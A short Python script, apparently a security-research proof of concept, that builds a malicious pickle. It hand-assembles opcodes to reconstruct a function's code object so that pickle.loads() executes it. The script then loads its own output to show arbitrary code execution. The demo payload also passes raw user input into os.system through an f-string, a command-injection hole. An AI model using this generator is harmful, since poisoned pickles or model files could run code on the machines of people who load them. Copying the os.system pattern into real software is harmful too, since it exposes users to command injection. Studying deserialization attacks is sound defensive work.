from hiddenpickle.repickler import RePickler, Instruction
import pickle

def gen_tuple(arr):
    instructions = [
        Instruction('mark', None),
    ]

    for i in arr:
        if i == None:
            instructions.extend([
                Instruction('none', None),
            ])
        elif type(i) == str:
            instructions.extend([
                Instruction('short_binunicode', i),
            ])
        elif type(i) == int:
            instructions.extend([
                Instruction('binint1', i),
            ])
        else:
            print("Doesn't currently handle", type(i))

    instructions.extend([
        Instruction('tuple', None),
    ])

    return instructions

# pass a function with no variables to this function to execute it
def create_generative_pickle(func):

    code = func.__code__

    instructions = [
        Instruction('proto', 4),
        Instruction('short_binunicode', 'types'),
        Instruction('short_binunicode', 'FunctionType'),
        Instruction('stack_global', None),
        Instruction('short_binunicode', 'types'),
        Instruction('short_binunicode', 'CodeType'),
        Instruction('stack_global', None),
        Instruction('mark', None),
        Instruction('binint1', code.co_argcount),
        Instruction('binint1', code.co_posonlyargcount),
        Instruction('binint1', code.co_kwonlyargcount),
        Instruction('binint1', code.co_nlocals),
        Instruction('binint1', code.co_stacksize),
        Instruction('binint1', code.co_flags),
        Instruction('short_binbytes', code.co_code),
    ]

    instructions.extend(gen_tuple(code.co_consts))
    instructions.extend(gen_tuple(code.co_names))
    instructions.extend(gen_tuple(code.co_varnames))

    instructions.extend([
        Instruction('short_binunicode', code.co_filename),
        Instruction('short_binunicode', code.co_name),
        Instruction('binint1', code.co_firstlineno),
        Instruction('short_binbytes', code.co_lnotab),
        Instruction('tuple', None),
        Instruction('reduce', None),
        Instruction('short_binunicode', 'builtins'),
        Instruction('short_binunicode', 'globals'),
        Instruction('stack_global', None),
        Instruction('empty_tuple', None),
        Instruction('reduce', None),
        Instruction('tuple2', None),
        Instruction('reduce', None),
        Instruction('empty_tuple', None),
        Instruction('reduce', None),
        Instruction('stop', None),
    ])

    return RePickler(b'').create_pickle(instructions)

def test():
    import os, time
    x = input()
    os.system(f"echo '{x}, pwned by HiddenLayer at {time.time()}'")

data = create_generative_pickle(test)

print("created data")

pickle.loads(data)